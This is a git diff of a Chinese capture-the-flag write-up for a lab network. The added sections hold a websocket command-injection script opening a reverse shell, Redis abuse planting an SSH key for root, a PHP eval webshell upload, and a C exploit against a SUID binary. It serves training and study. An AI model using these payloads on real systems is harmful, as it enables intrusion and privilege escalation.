@@ -21,12 +21,12 @@ Tags
 
 单层靶场环境，没有 Windows 机器
 
-| Name       | IP            | Note                                                     |
-| :--------- | :------------ | :------------------------------------------------------- |
-| Entrypoint | 172.22.10.22  | 任意文件下载 + Shiro 反序列化 -> flag1                   |
-| OpenRASP   | 172.22.10.3   | THinkPHP + OpenRASP -> flag2                             |
-| Unknown    | 172.22.10.154 | Apache + ThinkPHP V5.1.41 LTS  API -> 172.22.10.155:9501 |
-| Unknown    | 172.22.10.155 | swoole-http-server                                       |
+| Name     | IP            | Note                                                     |
+| :------- | :------------ | :------------------------------------------------------- |
+| Shiro    | 172.22.10.22  | EntryPoint + File Download + Shiro -> flag1              |
+| OpenRASP | 172.22.10.3   | THinkPHP + OpenRASP -> flag2                             |
+| Unknown  | 172.22.10.154 | Apache + ThinkPHP V5.1.41 LTS  API -> 172.22.10.155:9501 |
+| Unknown  | 172.22.10.155 | swoole-http-server                                       |
 
 ## 入口点探测
 
@@ -115,223 +115,7 @@ Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Sun, 29-Mar-2026 13:
 
 使用 Shiro 利用工具，尝试爆破 key 但是失败了，怀疑需要其他途径进行读取
 
-对页面源码进行分析，得到
-
-```javascript
-function uploadFile(file) {
-    console.log("上传文件到服务器:", file.name);
-    // 模拟上传文件的请求
-    fetch('/file/upload', {
-        method: 'POST',
-        body: file
-    })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("文件上传成功:", data);
-            } else {
-                console.error("文件上传失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("上传文件失败:", error);
-        });
-}
-
-function downloadFile(path) {
-    console.log(`正在下载文件: ${path}`);
-
-    // 模拟从服务器请求下载文件
-    fetch(`/file/download?path=${encodeURIComponent(path)}`, {
-        method: 'GET'
-    })
-        .then(response => {
-            if (!response.ok) {
-                throw new Error("文件下载失败，服务器返回错误");
-            }
-            return response.blob();  // 返回文件内容的 Blob 对象
-        })
-        .then(blob => {
-            // 创建一个 URL 对象用于下载文件
-            const link = document.createElement("a");
-            link.href = URL.createObjectURL(blob);
-            link.download = path.split('/').pop();  // 提取文件名作为下载时的文件名
-            link.click();  // 自动触发下载
-            console.log(`文件下载成功: ${path}`);
-        })
-        .catch(error => {
-            console.error("文件下载失败:", error);
-        });
-}
-
-function renameFile(filePath, newFileName) {
-    console.log(`重命名文件 ${filePath} 为 ${newFileName}`);
-    fetch('/file/rename', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ filePath, newFileName })
-    })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("文件重命名成功:", data);
-            } else {
-                console.error("文件重命名失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("重命名失败:", error);
-        });
-}
-
-function deleteFile(filePath) {
-    console.log("删除文件:", filePath);
-    fetch('/file/delete', {
-        method: 'DELETE',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ filePath })
-    })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("文件删除成功:", data);
-            } else {
-                console.error("文件删除失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("删除文件失败:", error);
-        });
-}
-
-function moveFile(sourcePath, destinationPath) {
-    console.log(`移动文件从 ${sourcePath} 到 ${destinationPath}`);
-    fetch('/file/move', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sourcePath, destinationPath })
-    })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("文件移动成功:", data);
-            } else {
-                console.error("文件移动失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("移动文件失败:", error);
-        });
-}
-
-function copyFile(sourcePath, destinationPath) {
-    console.log(`复制文件从 ${sourcePath} 到 ${destinationPath}`);
-    fetch('/file/copy', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sourcePath, destinationPath })
-    })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("文件复制成功:", data);
-            } else {
-                console.error("文件复制失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("复制文件失败:", error);
-        });
-}
-
-function readFile(filePath) {
-    console.log("读取文件:", filePath);
-    fetch(`/file/read?path=${encodeURIComponent(filePath)}`)
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("文件内容:", data.content);
-            } else {
-                console.error("读取文件失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("读取文件失败:", error);
-        });
-}
-
-function getFileStats(filePath) {
-    console.log("获取文件信息:", filePath);
-    fetch(`/file/stats?path=${encodeURIComponent(filePath)}`)
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("文件信息:", data.stats);
-            } else {
-                console.error("获取文件信息失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("获取文件信息失败:", error);
-        });
-}
-
-function searchFiles(query) {
-    console.log("搜索文件:", query);
-    fetch(`/file/search?query=${encodeURIComponent(query)}`)
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("搜索结果:", data.files);
-            } else {
-                console.error("搜索失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("搜索文件失败:", error);
-        });
-}
-
-function createDirectory(directoryPath) {
-    console.log("创建目录:", directoryPath);
-    fetch('/file/create-directory', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ directoryPath })
-    })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("目录创建成功:", data);
-            } else {
-                console.error("目录创建失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("创建目录失败:", error);
-        });
-}
-
-function deleteDirectory(directoryPath) {
-    console.log("删除目录:", directoryPath);
-    fetch('/file/delete-directory', {
-        method: 'DELETE',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ directoryPath })
-    })
-        .then(response => response.json())
-        .then(data => {
-            if (data.success) {
-                console.log("目录删除成功:", data);
-            } else {
-                console.error("目录删除失败:", data.message);
-            }
-        })
-        .catch(error => {
-            console.error("删除目录失败:", error);
-        });
-}
-```
+对页面源码进行分析，得到 [page.js](./attachment/page.js)
 
 利用文件下载接口
 
@@ -434,9 +218,24 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 [+] PocScan http://172.22.10.3 poc-yaml-thinkphp5023-method-rce poc1
 ```
 
+使用 gogo 做端口扫描
+
+```shell
+[+] [27ms] tcp://172.22.10.3:22         ssh:8.2p1        [open] SSH-2.0-OpenS  
+[+] [2505ms] http://172.22.10.3:80      Apache/2.4.41 (Ubuntu)  腾讯移动分析||poweredby:php/7.4.33       [200] HTTP/1.1 200 
+
+[+] [29ms] tcp://172.22.10.154:22               ssh:8.2p1        [open] SSH-2.0-OpenS  
+[+] [2504ms] http://172.22.10.154:80    Apache/2.4.41 (Ubuntu)           [200] HTTP/1.1 200  
+
+[+] [27ms] tcp://172.22.10.155:22               ssh:8.2p1        [open] SSH-2.0-OpenS  
+[+] [2534ms] http://172.22.10.155:80    Apache/2.4.41 (Ubuntu)           [200] Apache2 Ubuntu Default Page: It works  
+[+] [2504ms] http://172.22.10.155:9501  swoole-http-server               [400] HTTP/1.1 400 
+```
+
 搭建代理
 
 ```shell
+......
 ```
 
 ## 172.22.10.3 ThinkPHP + OpenRASP
@@ -473,7 +272,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 [-] 目标不存在tp5_index_construct_rce漏洞
 ```
 
-利用 tp5_construct_code 来进行攻击，但是由于存在有 OpenRASP 漏洞，所以不寻求命令执行，而是走LFI
+利用 `tp5_construct_code` 来进行攻击，但是由于存在有 OpenRASP 漏洞，所以不寻求命令执行，而是走 LFI
 
 ```plaintext
 POST /index.php?s=captcha HTTP/1.1
@@ -530,7 +329,7 @@ lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-在已经确定存在有 tp5_construct_code 并且链子可通的情况下，尝试读取 OpenRASP 策略
+在已经确定存在有 tp5\_construct\_code 并且链子可通的情况下，尝试读取 OpenRASP 策略
 
 ```plaintext
 POST /index.php?s=captcha HTTP/1.1
@@ -547,9 +346,9 @@ _method=__construct&filter[]=readfile&method=get&server[REQUEST_METHOD]=/opt/plu
 
 参考 [Blackmaze - C1trus](https://c1trus.top/37-machineswp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/machines/blackmaze.html)
 
-使用 concat_function UAF 配合链子，绕过 OpenRASP 实现 system 命令执行
+使用 concat\_function UAF 配合链子，绕过 OpenRASP 实现 system 命令执行
 
-参考 [deploy_shell.py](./attachment/deploy_shell.py) [get_shell.py](./attachment/get_shell.py)
+参考 [deploy\_shell.py](./attachment/deploy_shell.py) [get\_shell.py](./attachment/get_shell.py)
 
 尝试检索 suid 程序
 
@@ -619,148 +418,259 @@ mysql> show tables;
 | eb_agent_level                    |
 | eb_agent_level_task               |
 | eb_agent_level_task_record        |
-| eb_agreement                      |
-| eb_app_version                    |
-| eb_article                        |
-| eb_article_category               |
-| eb_article_content                |
-| eb_auxiliary                      |
-| eb_cache                          |
-| eb_capital_flow                   |
-| eb_category                       |
-| eb_delivery_service               |
-| eb_division_agent_apply           |
-| eb_diy                            |
-| eb_express                        |
-| eb_lang_code                      |
-| eb_lang_country                   |
-| eb_lang_type                      |
-| eb_live_anchor                    |
-| eb_live_goods                     |
-| eb_live_room                      |
-| eb_live_room_goods                |
-| eb_luck_lottery                   |
-| eb_luck_lottery_record            |
-| eb_luck_prize                     |
-| eb_member_card                    |
-| eb_member_card_batch              |
-| eb_member_right                   |
-| eb_member_ship                    |
-| eb_message_system                 |
-| eb_other_order                    |
-| eb_other_order_status             |
-| eb_out_account                    |
-| eb_out_interface                  |
-| eb_page_categroy                  |
-| eb_page_link                      |
-| eb_qrcode                         |
-| eb_routine_scheme                 |
-| eb_shipping_templates             |
-| eb_shipping_templates_free        |
-| eb_shipping_templates_no_delivery |
-| eb_shipping_templates_region      |
-| eb_sms_record                     |
-| eb_store_advance                  |
-| eb_store_bargain                  |
-| eb_store_bargain_user             |
-| eb_store_bargain_user_help        |
-| eb_store_cart                     |
-| eb_store_category                 |
-| eb_store_combination              |
-| eb_store_coupon_issue             |
-| eb_store_coupon_issue_user        |
-| eb_store_coupon_product           |
-| eb_store_coupon_user              |
-| eb_store_integral                 |
-| eb_store_integral_order           |
-| eb_store_integral_order_status    |
-| eb_store_order                    |
-| eb_store_order_cart_info          |
-| eb_store_order_economize          |
-| eb_store_order_invoice            |
-| eb_store_order_refund             |
-| eb_store_order_status             |
-| eb_store_pink                     |
-| eb_store_product                  |
-| eb_store_product_attr             |
-| eb_store_product_attr_result      |
-| eb_store_product_attr_value       |
-| eb_store_product_cate             |
-| eb_store_product_coupon           |
-| eb_store_product_description      |
-| eb_store_product_log              |
-| eb_store_product_relation         |
-| eb_store_product_reply            |
-| eb_store_product_rule             |
-| eb_store_product_virtual          |
-| eb_store_seckill                  |
-| eb_store_seckill_time             |
-| eb_store_service                  |
-| eb_store_service_feedback         |
-| eb_store_service_log              |
-| eb_store_service_record           |
-| eb_store_service_speechcraft      |
-| eb_store_visit                    |
-| eb_system_admin                   |
-| eb_system_attachment              |
-| eb_system_attachment_category     |
-| eb_system_city                    |
-| eb_system_config                  |
-| eb_system_config_tab              |
-| eb_system_crud                    |
-| eb_system_crud_data               |
-| eb_system_crud_list               |
-| eb_system_event                   |
-| eb_system_event_data              |
-| eb_system_file                    |
-| eb_system_file_info               |
-| eb_system_group                   |
-| eb_system_group_data              |
-| eb_system_log                     |
-| eb_system_menus                   |
-| eb_system_notice                  |
-| eb_system_notice_admin            |
-| eb_system_notification            |
-| eb_system_role                    |
-| eb_system_route                   |
-| eb_system_route_cate              |
-| eb_system_sign_reward             |
-| eb_system_storage                 |
-| eb_system_store                   |
-| eb_system_store_staff             |
-| eb_system_timer                   |
-| eb_system_user_level              |
-| eb_upgrade_log                    |
-| eb_user                           |
-| eb_user_address                   |
-| eb_user_bill                      |
-| eb_user_brokerage                 |
-| eb_user_brokerage_frozen          |
-| eb_user_cancel                    |
-| eb_user_enter                     |
-| eb_user_extract                   |
-| eb_user_friends                   |
-| eb_user_group                     |
-| eb_user_invoice                   |
-| eb_user_label                     |
-| eb_user_label_relation            |
-| eb_user_level                     |
-| eb_user_money                     |
-| eb_user_notice                    |
-| eb_user_notice_see                |
-| eb_user_recharge                  |
-| eb_user_search                    |
-| eb_user_sign                      |
-| eb_user_spread                    |
-| eb_user_visit                     |
-| eb_wechat_key                     |
-| eb_wechat_media                   |
-| eb_wechat_message                 |
-| eb_wechat_news_category           |
-| eb_wechat_qrcode                  |
-| eb_wechat_qrcode_cate             |
-| eb_wechat_qrcode_record           |
-| eb_wechat_reply                   |
+| ......                            |
 | eb_wechat_user                    |
 +-----------------------------------+
+```
+
+## 154 + 155 客服系统
+
+这里存在问题，154 是一个静态的 Vue 页面，而 155 是 Swoole 搭建的 websocket 接口
+
+文件上传行为，走的是 155
+
+文件如果通过检查，会从 155 落地在 154 上面
+
+也就意味着 154 或者 155 存在有一种通道
+
+## 155 websocket
+
+经过与云境工作人员进行确认，得知这一块突破口位于 155 上的 websocket 交互过程中存在有命令注入
+
+在转发监听器端口进内网之后，执行反弹 shell
+
+```python
+import websocket
+import json
+import base64
+
+ws = websocket.create_connection("ws://172.22.10.155:9501/", timeout=10)
+
+cmd = "bash -i >& /dev/tcp/172.22.10.22/10050 0>&1"
+b64_cmd = base64.b64encode(cmd.encode()).decode()
+payload = ";php -r '$s=fsockopen(\"172.22.10.22\",10050);proc_open(\"/bin/bash\",[$s,$s,$s],$p);'"
+
+msg = json.dumps({"emit": "msg", "message": "123", "token": payload})
+print(f"[>] Sending: {msg}")
+ws.send(msg)
+
+try:
+    resp = ws.recv()
+    print(f"[<] Received: {resp}")
+except:
+    print("[!] No response")
+
+ws.close()
+```
+
+得到
+
+```shell
+(local) pwncat$ back
+(remote) www-data@redis:/opt/server$ whoami
+www-data
+```
+
+按照惯例，扫描一下 suid 程序
+
+```shell
+(remote) www-data@redis:/opt/server$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/pkexec
+/usr/bin/staprun
+/usr/bin/chfn
+/usr/bin/fusermount
+/usr/bin/stapbpf
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+```
+
+换一个思路，发现 Redis 服务是 root 权限运行的，尝试利用
+
+```shell
+(remote) www-data@redis:/opt/server$ redis-cli
+127.0.0.1:6379> KEYS *
+1) "chat:messages:7ebaa1965c8e0068a4e8fe03c3d2d098"
+127.0.0.1:6379> config set dir /root/.ssh/
+OK
+127.0.0.1:6379> config set dbfilename authorized_keys
+OK
+127.0.0.1:6379> set x "\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICXL8CP5iFG0d5xOeS3IypE43bxAKlHltrPxNobAkmvi randark@kali\n\n"
+OK
+127.0.0.1:6379> save
+OK
+127.0.0.1:6379> exit
+```
+
+然后尝试连接
+
+```shell
+┌──(randark㉿kali)-[~/tmp/Yunjing-BlackMaze]
+└─$ proxychains ssh root@172.22.10.155 -i /home/randark/.ssh/id_ed25519
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  8.129.29.180:10001  ...  172.22.10.155:22  ...  OK
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+Welcome to Alibaba Cloud Elastic Compute Service !
+
+Last login: Wed Feb 12 12:24:24 2025 from 106.37.219.130
+root@redis:~# whoami
+root
+root@redis:~# cat /root/flag
+flag{4b9581e7-131c-414e-a65f-209a0e533eb8}
+```
+
+## 155 -> 154 传输通道
+
+读取 155 的 websocket 服务源码 [server.php](./attachment/server.php)
+
+发现 154 存在有一个上传接口 `http://172.22.10.154/api/upload/file` ，并似乎限制只允许 155 进行访问
+
+直接利用文件上传接口，上传一个 webshell 到 154
+
+```shell
+(remote) www-data@redis:/tmp$ echo '<?php @eval($_POST["cmd"]);?>' > shell.php
+(remote) www-data@redis:/tmp$ curl -X POST http://172.22.10.154/api/upload/file -F "File=@shell.php;type=application/octet-stream"
+{"code":0,"msg":"上传成功","data":{"src":"\/uploads\/file\/20260615\/316ae956aa4a2a979a06b6095b4822b1.php"}}
+```
+
+成功连接
+
+![img](img/image_20260632-213223.png)
+
+## 154 提权
+
+惯例起手 suid 检查
+
+```shell
+/usr/bin/pkexec
+/usr/bin/staprun
+/usr/bin/chfn
+/usr/bin/fusermount
+/usr/bin/stapbpf
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/check
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+```
+
+在其中发现 `/usr/bin/check` 非常规 suid 程序，反编译进行检查
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+    if ( a1 > 1 )
+    {
+        if ( !strcmp("command.enc", a2[1]) )
+        {
+        if ( !(unsigned int)sub_1746(a2[1]) )
+            return 0;
+        }
+        else if ( !(unsigned int)sub_154C(a2[1]) )
+        {
+        return 0;
+        }
+    }
+    else
+    {
+        printf("Usege:%s command.enc\n", *a2);
+    }
+    return 0;
+}
+```
+
+直接上 AI 做自动化逆向分析
+
+```c
+// from C1trus
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <openssl/aes.h>
+
+int main(int argc, char *argv[]) {
+    char *command = argc > 1 ? argv[1] : "cat /root/flag>/tmp/res.txt";
+    int cmd_len = strlen(command);
+    int padded_len = ((cmd_len / 16) + 1) * 16;
+    
+    unsigned char plaintext[512] = {0};
+    memcpy(plaintext, command, cmd_len);
+    
+    // Get time NOW - this must match check binary's time(0) call
+    time_t t = time(0);
+    
+    // Key: srand(t), all 16 bytes = rand() & 0xFF
+    unsigned char key[16], iv[16];
+    srand(t);
+    int kv = rand() & 0xFF;
+    memset(key, kv, 16);
+    
+    // IV: srand(t+2), all 16 bytes = rand() & 0xFF
+    // (check binary sleeps 2 seconds between key and IV generation)
+    srand(t + 2);
+    int iv_v = rand() & 0xFF;
+    memset(iv, iv_v, 16);
+    
+    // AES encrypt
+    AES_KEY enc_key;
+    AES_set_encrypt_key(key, 128, &enc_key);
+    unsigned char ciphertext[512] = {0};
+    unsigned char iv_copy[16];
+    memcpy(iv_copy, iv, 16);
+    AES_cbc_encrypt(plaintext, ciphertext, padded_len, &enc_key, iv_copy, AES_ENCRYPT);
+    
+    // Write to file (NOT named command.enc!)
+    FILE *f = fopen("/tmp/x.enc", "w");
+    for (int i = 0; i < padded_len; i++) fputc(ciphertext[i], f);
+    fputc('\n', f);
+    fclose(f);
+    
+    // IMMEDIATELY exec check - must be in same second as time(0) above
+    char *args[] = {"/usr/bin/check", "/tmp/x.enc", NULL};
+    char *env[] = {NULL};
+    execve("/usr/bin/check", args, env);
+    
+    // If execve fails
+    perror("execve");
+    return 1;
+}
+```
+
+执行编译并利用
+
+```shell
+(remote) www-data@customer:/tmp$ gcc exp.c -o exp -lcrypto
+(remote) www-data@customer:/tmp$ ./exp 
+
+(remote) www-data@customer:/tmp$ cat ./res.txt 
+flag{0609875d-0092-45a7-b675-afebf5e887c0}
 ```
